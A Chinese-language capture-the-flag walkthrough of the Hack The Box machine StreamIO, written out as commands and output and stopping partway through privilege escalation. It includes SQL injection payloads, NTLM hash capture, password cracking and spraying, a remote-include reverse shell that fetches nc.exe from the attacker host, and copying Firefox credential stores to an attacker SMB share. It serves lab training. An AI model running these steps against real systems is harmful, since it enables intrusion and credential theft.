StreamIO：10.10.11.158

kali  10.10.16.5

[HTB: StreamIO | 0xdf hacks stuff](https://0xdf.gitlab.io/2022/09/17/htb-streamio.html#shell-as-administrator)



# 信息搜集

端口探测：

```
nmap -p- --min-rate 10000 10.10.11.158
nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.158 -oN nmap.txt
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-11 14:25:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2023-09-11T14:27:05+00:00; +7h00m00s from scanner time.
|_http-title: Not Found
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-09-11T14:26:25
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

看到了几个域名 `streamIO.htb ` 、`watch.streamIO.htb`



子域名爆破，80 端口是 iis 默认页面，啥也没有，于是爆破 443 端口子域名

```
echo  "10.10.11.158 streamIO.htb  watch.streamIO.htb" >> /etc/hosts
```

```bash
wfuzz -u https://streamio.htb -H "Host: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315
```

```
000002268:   200        78 L     245 W      2829 Ch     "watch"                       
```



445端口smb：

```bash
└─# crackmapexec smb 10.10.11.158                                                                                                           
[*] Initializing FTP protocol database
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
```

得到机器名字 为 dc，于是也加入到 hosts

```bash
└─# smbclient -L //10.10.11.158 -N  
session setup failed: NT_STATUS_ACCESS_DENIED
```



# 443端口web渗透

## streamio.htb

<img src=".\图片\Snipaste_2023-09-11_15-39-50.png" alt="Snipaste_2023-09-11_15-39-50" style="zoom:80%;" />

看到 网站 支持 php 和 asp，这套系统是 php 写的。而且有 cookie 字段，说明很可能有鉴权之类的

目录爆破：

```bash
└─# feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k
```

```bash
301      GET        2l       10w      151c https://streamio.htb/images => https://streamio.htb/images/
301      GET        2l       10w      150c https://streamio.htb/admin => https://streamio.htb/admin/
301      GET        2l       10w      147c https://streamio.htb/js => https://streamio.htb/js/
301      GET        2l       10w      148c https://streamio.htb/css => https://streamio.htb/css/
200      GET      101l      173w     1663c https://streamio.htb/css/responsive.css
200      GET       51l      213w    19329c https://streamio.htb/images/client.jpg
200      GET      231l      571w     7825c https://streamio.htb/about.php
200      GET      206l      430w     6434c https://streamio.htb/contact.php
200      GET      111l      269w     4145c https://streamio.htb/login.php
200      GET      395l      915w    13497c https://streamio.htb/index.php
302      GET        0l        0w        0c https://streamio.htb/logout.php => https://streamio.htb/
200      GET        5l      374w    21257c https://streamio.htb/js/popper.min.js
200      GET      863l     1698w    16966c https://streamio.htb/css/style.css
200      GET      191l      253w     3120c https://streamio.htb/css/login.css
200      GET      121l      291w     4500c https://streamio.htb/register.php
200      GET      192l     1006w    82931c https://streamio.htb/images/icon.png
200      GET        2l     1276w    88145c https://streamio.htb/js/jquery-3.4.1.min.js
200      GET      367l     1995w   166220c https://streamio.htb/images/contact-img.png
200      GET      913l     5479w   420833c https://streamio.htb/images/about-img.png
200      GET      395l      915w    13497c https://streamio.htb/
301      GET        2l       10w      157c https://streamio.htb/admin/images => https://streamio.htb/admin/images/
301      GET        2l       10w      153c https://streamio.htb/admin/js => https://streamio.htb/admin/js/
301      GET        2l       10w      154c https://streamio.htb/admin/css => https://streamio.htb/admin/css/
200      GET      274l     1677w   150222c https://streamio.htb/images/barry.png
301      GET        2l       10w      150c https://streamio.htb/fonts => https://streamio.htb/fonts/
200      GET     1753l    10007w   871140c https://streamio.htb/images/oliver.png
200      GET     2059l    12754w  1028337c https://streamio.htb/images/samantha.png
403      GET        1l        1w       18c https://streamio.htb/admin/index.php
301      GET        2l       10w      156c https://streamio.htb/admin/fonts => https://streamio.htb/admin/fonts/
200      GET        2l        6w       58c https://streamio.htb/admin/master.php
```

看到关键的 https://streamio.htb/admin/ ，显示了  forbidden

<img src=".\图片\Snipaste_2023-09-11_15-50-07.png" alt="Snipaste_2023-09-11_15-50-07" style="zoom:80%;" />

登录页面试过了弱口令和注入，都不行；注册页面注册了账号后依然不能登录

<img src=".\图片\Snipaste_2023-09-11_15-50-36.png" alt="Snipaste_2023-09-11_15-50-36" style="zoom:80%;" />

于是再看看另一个域名

## watch.streamio.htb

<img src=".\图片\Snipaste_2023-09-11_15-53-39.png" alt="Snipaste_2023-09-11_15-53-39" style="zoom:80%;" />

对这个域名进行目录爆破

```bash
feroxbuster -u https://watch.streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k
```

```
200      GET        0l        0w   253887c https://watch.streamio.htb/search.php
```

/search.php 是一个电影搜索的功能点，但是触发关键注入语句 `id' or 1=1 -- -` 时跳到了拦截页面 /blocked.php

<img src=".\图片\Snipaste_2023-09-11_15-58-09.png" alt="Snipaste_2023-09-11_15-58-09" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-09-11_15-58-19.png" alt="Snipaste_2023-09-11_15-58-19" style="zoom:80%;" />

尝试正常使用搜索功能，发现 sql 语句可能是 like 这样的模糊查询

```
select * from movies where title like '%[input]%';
```

于是尝试 `man';-- -`，正常检索出来了 man 相关的电影

```
select * from movies where title like '%man';-- -%';
```

<img src=".\图片\Snipaste_2023-09-11_16-04-13.png" alt="Snipaste_2023-09-11_16-04-13" style="zoom:80%;" />

于是判断存在注入，mssql 注入

union 判断列数：

```
abcd' union select 1,2,3,4,5,6;-- -
```

<img src=".\图片\Snipaste_2023-09-11_16-06-15.png" alt="Snipaste_2023-09-11_16-06-15" style="zoom:80%;" />

尝试配合 Responder ：

```
abcd'; use master; exec xp_dirtree '\\10.10.16.5\share';-- -
```

Responder 监听得到

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.158
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:63c8495b2f15ac52:BC9ECFC7DE5F81A1C8CB9BD865873B43:010100000000000000901E25E5C6D8018E57573EFE652D490000000002000800420055004E00560001001E00570049004E002D004300540054004100430035004D004C00510039004B0004003400570049004E002D004300540054004100430035004D004C00510039004B002E00420055004E0056002E004C004F00430041004C0003001400420055004E0056002E004C004F00430041004C0005001400420055004E0056002E004C004F00430041004C000700080000901E25E5C6D8010600040002000000080030003000000000000000000000000030000081C387EB6618F4055A81A59670B08D5FF6E8C3BDE62A5B1E62C7D56B2A215D0A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
```

但是不好破解，先暂停这个思路，[Getting Creds via NTLMv2 | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html)

于是尝试注入出账号密码信息：

- 爆库

  ```
  abcd' union select 1,name,3,4,5,6 from master..sysdatabases;-- -
  ```

  <img src=".\图片\Snipaste_2023-09-11_16-15-28.png" alt="Snipaste_2023-09-11_16-15-28" style="zoom:67%;" />

- 显示当前的数据库

  ```
  abcd' union select 1,(select DB_NAME()),3,4,5,6;-- -
  ```

  为 `STREAMIO`

- 爆当前数据库的表名，得到两张表 `movies`、 `users`

  ```
  abcd' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U';-- -
  ```

  <img src=".\图片\Snipaste_2023-09-11_16-21-57.png" alt="Snipaste_2023-09-11_16-21-57" style="zoom:80%;" />

- 爆 users 表的列名

  ```
  abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -
  ```

  <img src=".\图片\Snipaste_2023-09-11_16-24-36.png" alt="Snipaste_2023-09-11_16-24-36" style="zoom:80%;" />

- 取出重要信息，username 和 password

  ```
  abcd' union select 1,concat(username,':',password),3,4,5,6 from users;-- -
  ```

  <img src=".\图片\Snipaste_2023-09-11_16-27-14.png" alt="Snipaste_2023-09-11_16-27-14" style="zoom:80%;" />

很多信息，需要我们整理

```bash
└─# cat user_pass
admin:665a50ac9eaa781e4f7f04199db97a11
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield:8097cedd612cc37c29db152b6e9edbd3
Gloria:0cfaaaafb559f081df2befbe66686de0
James:c660060492d9edcaa8332d89c99c9239
Juliette:6dcd87740abb64edfa36d170f0d5450d
Lauren:08344b85b329d7efd611b7a7743e8a09
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Robert:f03b910e2bd0313a23fdd7575f34a694
Robin:dc332fb5576e9631c9dae83f194f8e70
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Samantha:083ffae904143c4796e464dac33c1f7d
Stan:384463526d288edcc95fc3701e523bc7
Thane:3577c47eb1e12c8ba021611e1280753c
Theodore:925e5408ecb67aea449373d668b7359e
Victor:bf55e15b119860a6e6b5a164377da719
Victoria:b22abb47a02b52d5dfa27fb0b534f693
William:d62be0dc82071bccc1322d64ec5b6c51
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
```

## hashcat 爆破密码

```
hashcat user_pass /usr/share/wordlists/rockyou.txt --user -m 0
hashcat user_pass /usr/share/wordlists/rockyou.txt --user -m 0 --show
```

```
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
dfdfdf:ae27a4b4821b13cad2a17a75d219853e:dfdfdf
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

smb 密码喷射 爆破验证

```
cat cracked-passwords | cut -d: -f1 > user
cat cracked-passwords | cut -d: -f3 > pass
```

```
crackmapexec smb 10.10.11.158 -u user -p pass --no-bruteforce --continue-on-success
```

全失败

I could try WinRM, but it’s unlikely to work there if it doesn’t work on SMB.

## 进入web后台

hydra爆破https表单

```bash
└─# cat userpass cat cracked-passwords | cut -d: -f1,3 > userpass
└─# cat userpass 
admin:paddpadd
Barry:$hadoW
Bruno:$monique$1991$
Clara:%$clara
dfdfdf:dfdfdf
Juliette:$3xybitch
Lauren:##123a8j8w5123##
Lenord:physics69i
Michelle:!?Love?!123
Sabrina:!!sabrina$
Thane:highschoolmusical
Victoria:!5psycho8!
yoshihide:66boysandgirls..
```

```bash
└─# hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
```

得到账号密码

```
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
```

登录成功后再次访问 https://streamio.htb/admin/ ，显示出来功能点而不是 forbidden

<img src=".\图片\Snipaste_2023-09-11_16-49-09.png" alt="Snipaste_2023-09-11_16-49-09" style="zoom:80%;" />

查看源码后没发现其它接口，观察 url 功能点

```
https://streamio.htb/admin/?user=
https://streamio.htb/admin/?staff=
https://streamio.htb/admin/?movie=
https://streamio.htb/admin/?message=
```

是不是很想 fuzz，记得鉴权写上 cookie 字段 `PHPSESSID	"hjjd4egnalb7od8d65br48m6ph"`

```bash
wfuzz -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=hjjd4egnalb7od8d65br48m6ph" --hh 1678
```

```
000001575:   200        49 L     137 W      1712 Ch     "debug"      
```

找到一个接口 debug

尝试包含 /admin/master.php

<img src=".\图片\Snipaste_2023-09-11_16-59-25.png" alt="Snipaste_2023-09-11_16-59-25" style="zoom:80%;" />

用 伪协议

```http
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

<img src=".\图片\Snipaste_2023-09-11_17-00-31.png" alt="Snipaste_2023-09-11_17-00-31" style="zoom:80%;" />

包含 master.php 时，出现功能点

<img src=".\图片\Snipaste_2023-09-11_17-35-57.png" alt="Snipaste_2023-09-11_17-35-57" style="zoom:80%;" />

## 代码审计getshell

解码base64

```
echo "PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d > master.php
```

master.php 中的部分重要源码

```php
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
```

这时候可以尝试远程包含+代码执行

```bash
curl -X POST "https://streamio.htb/admin/?debug=master.php" --cookie "PHPSESSID=hjjd4egnalb7od8d65br48m6ph"  -d 'include=http://10.10.16.5/rce.php' -k
```

rce.php

```bash
└─# cat rce.php   
system("powershell -c wget 10.10.16.5/nc.exe -outfile \\programdata\\nc.exe");
system("\\programdata\\nc.exe -e powershell 10.10.16.5 443");
```

kali 监听得到 shell

```bash
└─# nc -lvvp 443                       
listening on [any] 443 ...
connect to [10.10.16.5] from streamIO.htb [10.10.11.158] 50020
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
whoami
streamio\yoshihide
```

# 提权

## 提权到nikk37用户

翻阅 web 网站文件，得到了一些账号密码

```powershell
PS C:\inetpub\streamio.htb> dir -recurse *.php | select-string -pattern "database"
dir -recurse *.php | select-string -pattern "database"

admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```

接下来可以连接数据库查看信息

### streamio_backup DB

I noted earlier that I couldn’t access the `streamio_backup` database. With new creds (and a user called admin), it’s worth trying again. I could upload [Chisel](https://github.com/jpillora/chisel) and tunnel to port 1433 (MSSQL), but `sqlcmd` happens to be installed and available on StreamIO:

```powershell
PS C:\> where.exe sqlcmd
where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
```

```powershel
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
```

```powershell
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
```

得到一些账号和面密码

```
nikk37                                             389d14cb8e4e9b94b137deb1caf0612a             
yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332            
James                                              c660060492d9edcaa8332d89c99c9239             
Theodore                                           925e5408ecb67aea449373d668b7359e            
Samantha                                           083ffae904143c4796e464dac33c1f7d             
Lauren                                             08344b85b329d7efd611b7a7743e8a09             
William                                            d62be0dc82071bccc1322d64ec5b6c51             
Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5            
```

整理

```bash
└─# cat user-passwords-backup 
nikk37:389d14cb8e4e9b94b137deb1caf0612a
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
James:c660060492d9edcaa8332d89c99c9239
Theodore:925e5408ecb67aea449373d668b7359e
Samantha:083ffae904143c4796e464dac33c1f7d
Lauren:08344b85b329d7efd611b7a7743e8a09
William:d62be0dc82071bccc1322d64ec5b6c51
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
```

hashcat 爆破 

```bash
hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user
hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user --show
```

```
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

### 登录nikk37用户

可以尝试密码喷射

```
cat user-passwords-backup | cut -d: -f 1 >> user
cat user-passwords-backup | cut -d: -f 3 >> pass 
```

```bash
crackmapexec smb 10.10.11.158 -u user -p pass --continue-on-success --no-bruteforce
```



```bash
└─# crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
SMB         10.10.11.158    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985/wsman
WINRM       10.10.11.158    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```



查看  `nikk37` 用户 信息

```powershell
PS C:\> net user nikk37
net user nikk37
User name                    nikk37
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:57:16 AM
Password expires             Never
Password changeable          2/23/2022 2:57:16 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/22/2022 3:39:51 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         
The command completed successfully.
```



登录

```bash
evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.10.11.158
```

```bash
*Evil-WinRM* PS C:\Users\nikk37\desktop> type user.txt
a873dde9b95743c77b2df74940ae58fb
```



## 提权到jdgodd用户



先枚举本地计算机里的重要信息，本着靠山吃山的原则看看，就先看看靶机安装了哪些应用吧

```powershell
*Evil-WinRM* PS C:\program files (x86)> ls


    Directory: C:\program files (x86)


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----        2/25/2022  11:35 PM                IIS
d-----        2/25/2022  11:38 PM                iis express
d-----        3/28/2022   4:46 PM                Internet Explorer
d-----        2/22/2022   1:54 AM                Microsoft SQL Server
d-----        2/22/2022   1:53 AM                Microsoft.NET
d-----        5/26/2022   4:09 PM                Mozilla Firefox
d-----        5/26/2022   4:09 PM                Mozilla Maintenance Service
d-----        2/25/2022  11:33 PM                PHP
d-----        2/22/2022   2:56 AM                Reference Assemblies
d-----        3/28/2022   4:46 PM                Windows Defender
d-----        3/28/2022   4:46 PM                Windows Mail
d-----        3/28/2022   4:46 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        3/28/2022   4:46 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                WindowsPowerShell
```

发现有火狐浏览器，我们可以试着抓抓其密码

谷歌找到其密码的路径

```powershell
*Evil-WinRM* PS C:\program files (x86)> cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release
```

我们需要两个文件 `key4.db`、`logins.json`，并需要把这两个文件传回 kali 来分析，用到 `smbserver.py`

kali 开启 smb 共享

```
./smbserver.py share . -user zf1yolo -pass zf1yolo -smb2support
```

靶机上传文件

```
net use \\10.10.16.5\share /u:zf1yolo zf1yolo
copy key4.db \\10.10.16.5\share\
copy logins.json \\10.10.16.5\share\
```



全网找 firefox 密码解密工具 [firepwd.py](https://github.com/lclevy/firepwd)

```bash
python firepwd.py

https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
